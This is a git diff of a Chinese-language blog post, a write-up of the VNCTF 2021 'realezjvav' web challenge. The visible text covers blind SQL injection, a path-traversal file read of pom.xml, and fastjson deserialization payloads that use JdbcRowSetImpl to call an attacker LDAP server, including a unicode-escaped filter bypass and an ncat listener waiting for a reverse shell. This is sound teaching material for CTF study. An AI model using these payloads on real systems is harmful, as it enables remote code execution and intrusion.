@@ -9,18 +9,18 @@
   
   <title>VNCTF 2021 realezjvav | nappingCat&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="0x01 第一关sql注入">
+  <meta name="description" content="0x01 第一关sql注入没有查询的回显，只有一个Only the admin can get the right page提示，应该是需要以admin身份登录，所以需要注入获得密码 尝试报错， 提交username&#x3D;admin&amp;password&#x3D;1&#39;返回500 Internal Server Error 提交username&#x3D;admin&amp;password&#x3D;1#&#39;回">
 <meta property="og:type" content="article">
 <meta property="og:title" content="VNCTF 2021 realezjvav">
 <meta property="og:url" content="https://123-prog.github.io/2021/04/04/VNCTF-2021-realezjvav/index.html">
 <meta property="og:site_name" content="nappingCat&#39;s Blog">
-<meta property="og:description" content="0x01 第一关sql注入">
+<meta property="og:description" content="0x01 第一关sql注入没有查询的回显，只有一个Only the admin can get the right page提示，应该是需要以admin身份登录，所以需要注入获得密码 尝试报错， 提交username&#x3D;admin&amp;password&#x3D;1&#39;返回500 Internal Server Error 提交username&#x3D;admin&amp;password&#x3D;1#&#39;回">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://123-prog.github.io/2021/04/04/VNCTF-2021-realezjvav/Snipaste_2021-04-04_15-22-18.png">
-<meta property="og:image" content="https://123-prog.github.io/2021/04/04/VNCTF-2021-realezjvav/Blog/blog/source_posts/VNCTF-2021-realezjvav/Snipaste_2021-04-04_15-44-49.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/04/04/VNCTF-2021-realezjvav/Snipaste_2021-04-04_15-44-49.png">
 <meta property="og:image" content="https://123-prog.github.io/2021/04/04/VNCTF-2021-realezjvav/Snipaste_2021-04-04_16-49-37.png">
 <meta property="article:published_time" content="2021-04-04T06:14:24.000Z">
-<meta property="article:modified_time" content="2021-04-04T08:59:20.843Z">
+<meta property="article:modified_time" content="2021-04-04T12:20:18.800Z">
 <meta property="article:author" content="Guangyue">
 <meta property="article:tag" content="fastjson反序列化漏洞，sql注入">
 <meta name="twitter:card" content="summary">
@@ -262,11 +262,11 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h3 id="0x01-第一关sql注入"><a href="#0x01-第一关sql注入" class="headerlink" title="0x01 第一关sql注入"></a>0x01 第一关sql注入</h3><a id="more"></a>
-
-<p>没有查询的回显，只有一个<code>Only the admin can get the right page</code>提示，应该是需要以admin身份登录，所以需要注入获得密码</p>
+        <h3 id="0x01-第一关sql注入"><a href="#0x01-第一关sql注入" class="headerlink" title="0x01 第一关sql注入"></a>0x01 第一关sql注入</h3><p>没有查询的回显，只有一个<code>Only the admin can get the right page</code>提示，应该是需要以admin身份登录，所以需要注入获得密码</p>
 <p>尝试报错， 提交<code>username=admin&amp;password=1&#39;</code>返回<code>500 Internal Server Error</code></p>
 <p>提交<code>username=admin&amp;password=1#&#39;</code>回显正常，证明sql语句报错会直接返回<code>500 Internal Server Error</code></p>
+<a id="more"></a>
+
 <p>那就再试试盲注，先跑一下过滤了什么</p>
 <p>在密码中如果包含被过滤关键字会返回hacker字样</p>
 <p>在burpsuite中用字典跑一下</p>
@@ -279,7 +279,7 @@
 <h3 id="0x02-第二关"><a href="#0x02-第二关" class="headerlink" title="0x02 第二关"></a>0x02 第二关</h3><p>登录成功跳转到一个角色选择页面</p>
 <p>用burpsuite抓包，发现请求发送的是json格式数据，八九不离十就是java的反序列化漏洞利用</p>
 <p>阅读源码发现有一个文件任意读</p>
-<p><img src="/2021/04/04/VNCTF-2021-realezjvav/Blog\blog\source_posts\VNCTF-2021-realezjvav\Snipaste_2021-04-04_15-44-49.png"></p>
+<p><img src="/2021/04/04/VNCTF-2021-realezjvav/Snipaste_2021-04-04_15-44-49.png"></p>
 <p>熟悉java项目的话，就可以尝试读取一下pom.xml文件，这个文件是使用maven构建java项目时用于声明依赖的地方，通过这个文件就可以看到这个java项目用了什么依赖</p>
 <p><code>/searchimage?img=../../../../../pom.xml</code></p>
 <p>返回pom.xml内容</p>
@@ -323,7 +323,9 @@
 <p>现在有三个服务正在跑</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http服务：Serving HTTP on 0.0.0.0 port 80 (http:&#x2F;&#x2F;0.0.0.0:80&#x2F;) ...</span><br><span class="line">ldap服务：Listening on 0.0.0.0:1389</span><br><span class="line">nc准备接收反弹的shell：</span><br><span class="line">Ncat: Version 7.70 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )</span><br><span class="line">Ncat: Listening on :::9999</span><br><span class="line">Ncat: Listening on 0.0.0.0:9999</span><br></pre></td></tr></table></figure>
 <p>提交payload</p>
-<p><code>&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://IP:7777/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;&#125;</code></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://IP:7777/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
 <p>发现存在过滤，但fastjson比较奇葩，允许你使用unicode编码或16进制编码，它会自动给你解析，所以简单通过unicode绕过</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;&#125;,&quot;x&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;,&quot;dataSourceName&quot;:&quot;ldap://ip:port/Exploit&quot;,&quot;\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074&quot;:true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
 <p>ip:port是ldap服务的服务器ip和端口</p>
@@ -340,7 +342,7 @@
         <p><span>本文标题:</span><a  href="/2021/04/04/VNCTF-2021-realezjvav/">VNCTF 2021 realezjvav</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问  的个人博客"></a></p>
         <p><span>发布时间:</span>2021年04月04日 - 14时14分</p>
-        <p><span>最后更新:</span>2021年04月04日 - 16时59分</p>
+        <p><span>最后更新:</span>2021年04月04日 - 20时20分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2021/04/04/VNCTF-2021-realezjvav/" title="VNCTF 2021 realezjvav">https://123-prog.github.io/2021/04/04/VNCTF-2021-realezjvav/</a>
             <span class="copy-path" data-clipboard-text="原文: https://123-prog.github.io/2021/04/04/VNCTF-2021-realezjvav/　　作者: " title=""></span>
